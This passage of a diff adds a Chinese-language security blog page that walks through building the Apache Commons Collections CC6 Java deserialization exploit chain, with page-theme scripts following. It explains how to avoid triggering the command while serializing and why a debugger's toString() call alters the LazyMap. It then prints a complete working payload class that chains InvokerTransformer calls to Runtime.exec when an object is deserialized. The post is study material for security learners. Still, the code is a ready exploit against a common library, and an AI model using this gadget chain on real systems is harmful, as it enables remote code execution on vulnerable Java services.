unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload 构造完成，但是在运行的时候会发现一个问题，就是序列化的时候也会进行一次命令执行，原因是 HashMap 的 put 方法也会调用 key 的 hashCode 方法。</p>
+<p><strong>HashMap 的 put 方法：</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会调用 HashMap 的 hash 方法，进而调用 key 的 hashCode 方法。</p>
+<p>我们肯定不希望自己的计算机上也执行一遍恶意命令对吧，所以我们需要避免序列化的时候命令执行，这也是以后的反序列化利用需要注意的问题。</p>
+<h3 id="改进-payload"><a href="#改进-payload" class="headerlink" title="改进 payload"></a>改进 payload</h3><p>如何避免序列化时命令执行呢，在 map.put 方法执行之前，我们先传入一个不包含 chainedTransformer 的 LazyMap 对象，在 map.put 方法执行之后，再修改这个 LazyMap 对象的 factory 属性为 chainedTransformer 即可。</p>
+<h4 id="问题抛出"><a href="#问题抛出" class="headerlink" title="问题抛出"></a>问题抛出</h4><p>然而当我这样修改之后，又发现了一个问题：</p>
+<p>我在调用 TiedMapEntry 构造方法时： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.map = map;</span><br><span class="line">    this.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>明明代码上只写了将传入的 key 作为 TiedMapEntry 对象的 key 属性值，但是在执行完这一步后发现 TiedMapEntry 对象的 map 属性的 key 属性值也变为了传入的 key 值。</p>
+<p>执行 this.key &#x3D; key 之前，map 中只有一个 null -&gt; 1 的键值对：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240514174305665.png">
+
+<p>执行 this.key &#x3D; key 之后，map 中多了一个 aaa -&gt; 1 的键值对：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240514174609890.png">
+
+<p>很奇异，翻了很多大佬的博客，但是都没有讲明原因，后来与好友交流，得出了一种较为合理的解释。</p>
+<p>参见：<a target="_blank" rel="noopener" href="https://yyjccc.github.io/2024/05/14/%E5%B9%BD%E9%BB%98%E7%9A%84Common-Collections6%E8%B0%83%E8%AF%95/">幽默的Common-Collections6调试</a> </p>
+<p>还记得我们之前说过的吗：IDEA 在 debug 时，当 debug 到某个对象的时候，会调用对象的 toString() 方法，用来在 debug 界面显示对象信息。</p>
+<p>这里正是由于 TiedMapEntry 对象的 toString() 方法在调试时被调用了，来看 TiedMapEntry 的 toString() 方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public String toString() &#123;</span><br><span class="line">    return getKey() + &quot;=&quot; + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里调用了 TiedMapEntry 的 getValue() 方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是就会接着调用其成员属性 map 的 get() 方法，也即 LazyMap 对象的 get() 方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    // create value for key if key is not currently in the map</span><br><span class="line">    if (map.containsKey(key) == false) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一次进来，LazyMap 对象的 map 属性 key 值为 null ，不包含传入的 key 值，所以进入判断，在 <code>map.put(key, value);</code> 处将 LazyMap 对象的 map 属性 key 值设置成了传入的 key 值，这就造成了调试完 TiedMapEntry 构造方法后 LazyMap 对象的 map 属性就已经有 key 值了。</p>
+<p>所以如果是真实运行环境的话，它的流程应该是这样的：在 TiedMapEntry 的构造方法被调用之后，调用 HashMap 的 put 方法时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry tiedMapeEntry = new TiedMapEntry(lazymap, &quot;key&quot;);</span><br><span class="line">HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">map2.put(tiedMapeEntry, &quot;test&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>运行时调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map2::put() -&gt; map2::hash() -&gt; tiedMapeEntry::hashCode() -&gt; tiedMapeEntry::getValue() -&gt; lazymap::get()</span><br></pre></td></tr></table></figure>
+
+<p>于是在这里 lazymap 的 map 属性的 key 值被设置成了传入的 key 值，这将导致下一次调用 lazymap 的 get() 方法时（反序列化时）将不会进入判断，从而无法命令执行。</p>
+<p>所以需要在 put 方法调用完之后删除掉 lazymap 的 map 属性的 key 值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazymap.remove(&quot;key&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="构造-payload2"><a href="#构造-payload2" class="headerlink" title="构造 payload2"></a>构造 payload2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class payload2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                // 将传入参数固定为 Runtime.class</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 Map 对象，无关紧要，只是作为参数传入</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 LazyMap</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TiedMapEntry ，第二个参数为 key 值，先随便传一个</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, &quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 HashMap</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 删除 lazymap 对象中的 key 值</span><br><span class="line">        lazymap.remove(&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 反射修改 lazymap 对象的 factory 属性</span><br><span class="line">        Class&lt;? extends Map&gt; lazymapClass = lazymap.getClass();</span><br><span class="line">        Field factory = lazymapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazymap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // serialize(map);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>至此就完成了。</p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>真理是越辩越明的。</p>
+
+
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F01-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">内网渗透 01 - 端口转发</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/05/12/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC1%E9%93%BEysoserial%E7%89%88/">漏洞篇 - CC1 链之 ysoserial 版</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">妙尽璇机</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8">Stellar 1.26.8</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+<div class="main-mask" onclick="sidebar.toggle()"></div></div></div><div class="scripts">
+<script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.26.8';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
   }
-  .l_body {
-    padding: 0;
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js","transition":"fade"});
   }
-  .l_body .l_left {
-    position: fixed;
-    transform: translateX(-320px);
-    margin: 0;
-    left: 8px;
-    box-shadow: $boxshadow-card-float;
-    z-index: 10;
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
   }
-  .l_body .l_main {
-    max-width: 100%;
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js","distance":"16px","duration":800,"interval":100,"scale":1});
   }
-  .l_body.mobile .l_left {
-    transition: transform 0.38s ease-out;
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","flying_pages":"https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"});
   }
-  .l_body.mobile.sidebar .l_left {
-    transform: translateX(0px);
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js","css":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css","selector":null});
   }
-  .l_body.mobile.sidebar .main-mask {
-    opacity: 1;
-    pointer-events: inherit;
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
   }
-}
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.26.8" async></script>
+
+<!-- optional -->
+
+
+
+
+
+
+<!-- inject -->
+<script type="text/javascript" src="/custom/js/ZYCode.js"></script>
+</div></body></html>
